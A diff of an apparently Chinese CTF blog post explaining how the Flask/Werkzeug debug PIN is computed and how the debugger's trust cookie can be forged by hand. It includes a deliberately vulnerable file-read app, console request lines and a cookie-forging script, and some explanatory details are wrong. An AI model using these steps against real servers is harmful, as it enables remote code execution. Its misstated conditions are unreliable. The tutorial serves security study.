@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="UTF-8" />
-    <title>flask算pin码 | 雲流のLowest World</title>
+    <title>flask debug模式算pin码 | 雲流のLowest World</title>
     <meta name="author" content="C1oudfL0w0" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -85,7 +85,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fas fa-stream"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PIN%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">PIN码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">生成原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E8%84%9A%E6%9C%AC"><span class="toc-number">3.</span> <span class="toc-text">生成脚本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">4.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web801"><span class="toc-number">4.1.</span> <span class="toc-text">ctfshow web801</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PIN%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">PIN码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">生成原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E8%84%9A%E6%9C%AC"><span class="toc-number">2.2.</span> <span class="toc-text">生成脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%8B%E7%AE%97cookie"><span class="toc-number">3.</span> <span class="toc-text">手算cookie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">4.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web801"><span class="toc-number">4.1.</span> <span class="toc-text">ctfshow web801</span></a></li></ol></li></ol>
     </div>
   
 
@@ -233,7 +233,7 @@
 
                 <div class="article">
     <div>
-        <h1>flask算pin码</h1>
+        <h1>flask debug模式算pin码</h1>
     </div>
     <div class="info">
         <span class="date">
@@ -260,12 +260,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/python/" style="color: #00a596">python</a>
+                <a href="/blog/tags/python/" style="color: #03a9f4">python</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/blog/tags/flask/" style="color: #00bcd4">flask</a>
+                <a href="/blog/tags/flask/" style="color: #ffa2c4">flask</a>
             </span>
             
         </span>
@@ -279,7 +279,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">1.6k字</span>
+        <span class="post-count">2.6k字</span>
       </span>
     </span>
 
@@ -288,7 +288,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">8分</span>
+        <span class="post-count">14分</span>
       </span>
     </span>
     
@@ -303,11 +303,14 @@
     </div>
     
     <div class="content" v-pre>
-        <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54648419/article/details/123632203">参考Ys3ter的文章</a></p>
-<h1 id="PIN码"><a href="#PIN码" class="headerlink" title="PIN码"></a>PIN码</h1><p>pin码也就是flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54648419/article/details/123632203">https://blog.csdn.net/weixin_54648419/article/details/123632203</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/m1xian/p/18528813#%E6%89%8B%E7%AE%97cookie">https://www.cnblogs.com/m1xian/p/18528813#%E6%89%8B%E7%AE%97cookie</a></p>
 <span id="more"></span>
 
-<h1 id="生成原理"><a href="#生成原理" class="headerlink" title="生成原理"></a>生成原理</h1><p>前面全是获取值，最后进行加密(注：python3.6和python3.8的MD5加密和sha1加密不同)</p>
+<hr>
+<h1 id="PIN码"><a href="#PIN码" class="headerlink" title="PIN码"></a>PIN码</h1><p>pin码也就是flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式</p>
+<h2 id="生成原理"><a href="#生成原理" class="headerlink" title="生成原理"></a>生成原理</h2><p>前面全是获取值，最后进行加密(注：python3.6和python3.8的MD5加密和sha1加密不同)</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#生效时间为一周</span>
 PIN_TIME <span class="token operator">=</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span>
 
@@ -515,7 +518,7 @@ _machine_id<span class="token punctuation">:</span> t<span class="token punctuat
 <p>每一个机器都会有自已唯一的id，linux的id一般存放在<code>/etc/machine-id</code>或<code>/proc/sys/kernel/random/boot_id</code>，docker靶机则读取<code>/proc/self/cgroup</code>，其中第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id，在非docker环境下读取后两个，非docker环境三个都需要读取</p>
 </li>
 </ol>
-<h1 id="生成脚本"><a href="#生成脚本" class="headerlink" title="生成脚本"></a>生成脚本</h1><ul>
+<h2 id="生成脚本"><a href="#生成脚本" class="headerlink" title="生成脚本"></a>生成脚本</h2><ul>
 <li>python3.6</li>
 </ul>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#MD5</span>
@@ -607,6 +610,160 @@ rv <span class="token operator">=</span><span class="token boolean">None</span>
         rv <span class="token operator">=</span> num
 
 <span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<hr>
+<h1 id="手算cookie"><a href="#手算cookie" class="headerlink" title="手算cookie"></a>手算cookie</h1><p>当我们无法获取返回的cookie，也无法直接 &#x2F;console 进入交互式 debug 的控制台的时候就需要我们手算cookie了</p>
+<p>起一个 flask 测试一下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">"Hello World"</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/read"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">read_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    file_path <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+            content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> content
+    <span class="token keyword">except</span> Exception <span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> FileNotFoundError
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> use_reloader<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>访问 &#x2F;console 后进行了以下请求：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">127.0.0.1 - - [13/Jan/2025 11:52:17] "GET /console HTTP/1.1" 200 -
+127.0.0.1 - - [13/Jan/2025 11:52:17] "GET /console?__debugger__=yes&amp;cmd=resource&amp;f=style.css HTTP/1.1" 200 -
+127.0.0.1 - - [13/Jan/2025 11:52:17] "GET /console?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js HTTP/1.1" 200 -
+127.0.0.1 - - [13/Jan/2025 11:52:17] "GET /console?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js HTTP/1.1" 200 -
+127.0.0.1 - - [13/Jan/2025 11:52:17] "GET /console?__debugger__=yes&amp;cmd=resource&amp;f=console.png HTTP/1.1" 200 -
+127.0.0.1 - - [13/Jan/2025 11:52:18] "GET /?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=debugger.js HTTP/1.1" 200 -
+127.0.0.1 - - [13/Jan/2025 11:52:18] "GET /moz-extension://016c7740-aa64-4847-9c1f-1ef8a751c64b/image/inject.js HTTP/1.1" 404 -    
+ * To enable the debugger you need to enter the security pin:
+ * Debugger pin code: 208-512-232
+127.0.0.1 - - [13/Jan/2025 11:52:18] "GET /console?__debugger__=yes&amp;cmd=printpin&amp;s=G0EO7wRdyKFZ4qHwRtMa HTTP/1.1" 200 -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注意到这里打印出了 PIN 码，触发这个请求方式是：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/console?__debugger__=yes&amp;cmd=printpin&amp;s=G0EO7wRdyKFZ4qHwRtMa</span> <span class="token http-version property">HTTP/1.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>而 s 参数接收的是 SECRET，这个在页面的html中可以获取到</p>
+<p><img src="/blog/2023/06/01/flask%E7%AE%97pin%E7%A0%81/image-20250113201427611.png" alt="image-20250113201427611"></p>
+<p>当我们提交了正确的PIN码时，请求方式如下：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=208-512-232&amp;s=G0EO7wRdyKFZ4qHwRtMa</span> <span class="token http-version property">HTTP/1.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/01/flask%E7%AE%97pin%E7%A0%81/image-20250113201857841.png" alt="image-20250113201857841"></p>
+<p>此时 cmd 参数为 pinauth 即进行PIN码验证</p>
+<p>返回<code>&#123;&quot;auth&quot;: true, &quot;exhausted&quot;: false&#125;</code>和 cookie：<code>__wzd9b8e343fd9d7f15c6e85=1736770660|42f5834bd160</code></p>
+<p>然后当我们带着这个cookie执行命令时的请求如下：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/console?&amp;__debugger__=yes&amp;cmd=print(123)&amp;frm=0&amp;s=G0EO7wRdyKFZ4qHwRtMa</span> <span class="token http-version property">HTTP/1.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/01/flask%E7%AE%97pin%E7%A0%81/image-20250113202139444.png" alt="image-20250113202139444"></p>
+<p>此时多了一个 frm 参数，即 frame 当前帧，这个只有报错时会在html上出现对应元素，通常情况都是0</p>
+<p><img src="/blog/2023/06/01/flask%E7%AE%97pin%E7%A0%81/image-20250113202731802.png" alt="image-20250113202731802"></p>
+<br>
+
+<p>接下来下断点在 app.run 调试跟进</p>
+<p>最终来到 site-packages&#x2F;werkzeug&#x2F;debug_<em>init</em>_.py</p>
+<p><img src="/blog/2023/06/01/flask%E7%AE%97pin%E7%A0%81/image-20250113204148634.png" alt="image-20250113204148634"></p>
+<p>即前文PIN码生成原理的部分，由那6个参数生成</p>
+<p>接下来观察一下认证方法 pin_auth：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pin_auth</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">:</span> Request<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Authenticates with the pin."""</span>
+    exhausted <span class="token operator">=</span> <span class="token boolean">False</span>
+    auth <span class="token operator">=</span> <span class="token boolean">False</span>
+    trust <span class="token operator">=</span> self<span class="token punctuation">.</span>check_pin_trust<span class="token punctuation">(</span>request<span class="token punctuation">.</span>environ<span class="token punctuation">)</span>
+    pin <span class="token operator">=</span> t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>pin<span class="token punctuation">)</span>
+
+    <span class="token comment"># If the trust return value is `None` it means that the cookie is</span>
+    <span class="token comment"># set but the stored pin hash value is bad.  This means that the</span>
+    <span class="token comment"># pin was changed.  In this case we count a bad auth and unset the</span>
+    <span class="token comment"># cookie.  This way it becomes harder to guess the cookie name</span>
+    <span class="token comment"># instead of the pin as we still count up failures.</span>
+    bad_cookie <span class="token operator">=</span> <span class="token boolean">False</span>
+    <span class="token keyword">if</span> trust <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>_fail_pin_auth<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        bad_cookie <span class="token operator">=</span> <span class="token boolean">True</span>
+
+        <span class="token comment"># If we're trusted, we're authenticated.</span>
+    <span class="token keyword">elif</span> trust<span class="token punctuation">:</span>
+        auth <span class="token operator">=</span> <span class="token boolean">True</span>
+
+        <span class="token comment"># If we failed too many times, then we're locked out.</span>
+    <span class="token keyword">elif</span> self<span class="token punctuation">.</span>_failed_pin_auth <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>
+        exhausted <span class="token operator">=</span> <span class="token boolean">True</span>
+
+        <span class="token comment"># Otherwise go through pin based authentication</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        entered_pin <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">"pin"</span><span class="token punctuation">]</span>
+
+        <span class="token keyword">if</span> entered_pin<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">==</span> pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            self<span class="token punctuation">.</span>_failed_pin_auth <span class="token operator">=</span> <span class="token number">0</span>
+            auth <span class="token operator">=</span> <span class="token boolean">True</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            self<span class="token punctuation">.</span>_fail_pin_auth<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+            rv <span class="token operator">=</span> Response<span class="token punctuation">(</span>
+                json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"auth"</span><span class="token punctuation">:</span> auth<span class="token punctuation">,</span> <span class="token string">"exhausted"</span><span class="token punctuation">:</span> exhausted<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                mimetype<span class="token operator">=</span><span class="token string">"application/json"</span><span class="token punctuation">,</span>
+            <span class="token punctuation">)</span>
+            <span class="token keyword">if</span> auth<span class="token punctuation">:</span>
+                rv<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span>
+                    self<span class="token punctuation">.</span>pin_cookie_name<span class="token punctuation">,</span>
+                    <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>hash_pin<span class="token punctuation">(</span>pin<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>
+                    httponly<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
+                    samesite<span class="token operator">=</span><span class="token string">"Strict"</span><span class="token punctuation">,</span>
+                    secure<span class="token operator">=</span>request<span class="token punctuation">.</span>is_secure<span class="token punctuation">,</span>
+                <span class="token punctuation">)</span>
+            <span class="token keyword">elif</span> bad_cookie<span class="token punctuation">:</span>
+                rv<span class="token punctuation">.</span>delete_cookie<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pin_cookie_name<span class="token punctuation">)</span>
+                <span class="token keyword">return</span> rv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>直接看最底下设置 cookie 的部分，cookie 值为<code>&#123;int(time.time())&#125;|&#123;hash_pin(pin)&#125;</code></p>
+<p>然后是 check_pin_trust 方法：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">check_pin_trust</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> environ<span class="token punctuation">:</span> <span class="token string">"WSGIEnvironment"</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span><span class="token builtin">bool</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Checks if the request passed the pin test.  This returns `True` if the
+        request is trusted on a pin/cookie basis and returns `False` if not.
+        Additionally if the cookie's stored pin hash is wrong it will return
+        `None` so that appropriate action can be taken.
+        """</span>
+    <span class="token keyword">if</span> self<span class="token punctuation">.</span>pin <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">True</span>
+    val <span class="token operator">=</span> parse_cookie<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pin_cookie_name<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> val <span class="token keyword">or</span> <span class="token string">"|"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> val<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    ts_str<span class="token punctuation">,</span> pin_hash <span class="token operator">=</span> val<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        ts <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ts_str<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+    <span class="token keyword">if</span> pin_hash <span class="token operator">!=</span> hash_pin<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pin<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">None</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> PIN_TIME<span class="token punctuation">)</span> <span class="token operator">&lt;</span> ts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>return (time.time() - PIN_TIME) &lt; int(ts)</code>，这里返回true才能完成认证</p>
+<p>PIN_TIME 在上面定义为<code>60*60*24*7</code>，而 ts 是我们|前填入的值，要大于 <code>time.time()+60*60*24*7</code></p>
+<p>那么就能简单生成一个 cookie：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
+<span class="token keyword">import</span> time
+
+
+<span class="token comment"># A week</span>
+PIN_TIME <span class="token operator">=</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span>
+
+
+<span class="token keyword">def</span> <span class="token function">hash_pin</span><span class="token punctuation">(</span>pin<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pin<span class="token punctuation">&#125;</span></span><span class="token string"> added salt"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">,</span> <span class="token string">"replace"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span>
+
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>hash_pin<span class="token punctuation">(</span><span class="token string">'208-512-232'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
